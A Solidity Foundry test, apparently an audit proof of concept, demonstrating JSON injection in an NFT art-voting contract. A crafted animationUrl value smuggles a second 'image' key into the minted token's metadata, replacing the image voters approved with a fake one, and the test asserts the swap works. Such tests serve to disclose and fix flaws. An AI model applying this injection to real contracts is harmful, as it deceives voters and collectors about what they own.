// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";
import { DescriptorTest } from "./Descriptor.t.sol";
import { ICultureIndex } from "../../src/interfaces/ICultureIndex.sol";

contract JsonInjectionAttackTest is DescriptorTest {
    function setUp() public override {
        super.setUp();
        super.setMockParams();

        super.setRevolutionTokenParams("Vrbs", "VRBS", "https://example.com/token/", "Vrb");

        super.setCultureIndexParams("Vrbs", "Our community Vrbs. Must be 32x32.", 10, 500, 0);

        super.deployMock();
    }

    function testImageReplacementAttack() public {
        ICultureIndex.CreatorBps[] memory creators = _createArtPieceCreators();
        ICultureIndex.ArtPieceMetadata memory metadata = ICultureIndex.ArtPieceMetadata({
            name: "Mona Lisa",
            description: "A renowned painting by Leonardo da Vinci",
            mediaType: ICultureIndex.MediaType.IMAGE,
            image: "ipfs://realMonaLisa",
            text: "",
            animationUrl: '", "image": "ipfs://fakeMonaLisa' // malicious string injected
        });

        vm.startPrank(address(revolutionPointsEmitter));
        revolutionPoints.mint(address(this), 10_000e18);
        vm.stopPrank();
        vm.roll(block.number + 1); // ensure vote snapshot is taken

        uint256 pieceId = cultureIndex.createPiece(metadata, creators);

        cultureIndex.vote(pieceId);

        // 1. the image used during voting stage is 'ipfs://realMonaLisa'
        ICultureIndex.ArtPiece memory topPiece = cultureIndex.getTopVotedPiece();
        assertEq(pieceId, topPiece.pieceId);
        assertEq(keccak256("ipfs://realMonaLisa"), keccak256(bytes(topPiece.metadata.image)));

        // 2. after being minted to VerbsToken, the image becomes to 'ipfs://fakeMonaLisa'
        vm.startPrank(address(auction));
        uint256 tokenId = revolutionToken.mint();
        vm.stopPrank();
        assertEq(pieceId, tokenId);
        string memory encodedURI = revolutionToken.tokenURI(tokenId);
        console2.log(encodedURI);
        string memory prefix = _substring(encodedURI, 0, 29);
        assertEq(keccak256("data:application/json;base64,"), keccak256(bytes(prefix)));
        string memory actualBase64Encoded = _substring(encodedURI, 29, bytes(encodedURI).length);
        string
            memory expectedBase64Encoded = "eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=";
        assertEq(keccak256(bytes(expectedBase64Encoded)), keccak256(bytes(actualBase64Encoded)));
    }

    function _createArtPieceCreators() internal pure returns (ICultureIndex.CreatorBps[] memory) {
        ICultureIndex.CreatorBps[] memory creators = new ICultureIndex.CreatorBps[](1);
        creators[0] = ICultureIndex.CreatorBps({ creator: address(0xc), bps: 10_000 });
        return creators;
    }

    function _substring(string memory str, uint256 startIndex, uint256 endIndex) internal pure returns (string memory) {
        bytes memory strBytes = bytes(str);
        bytes memory result = new bytes(endIndex - startIndex);
        for (uint256 i = startIndex; i < endIndex; i++) {
            result[i - startIndex] = strBytes[i];
        }
        return string(result);
    }
}
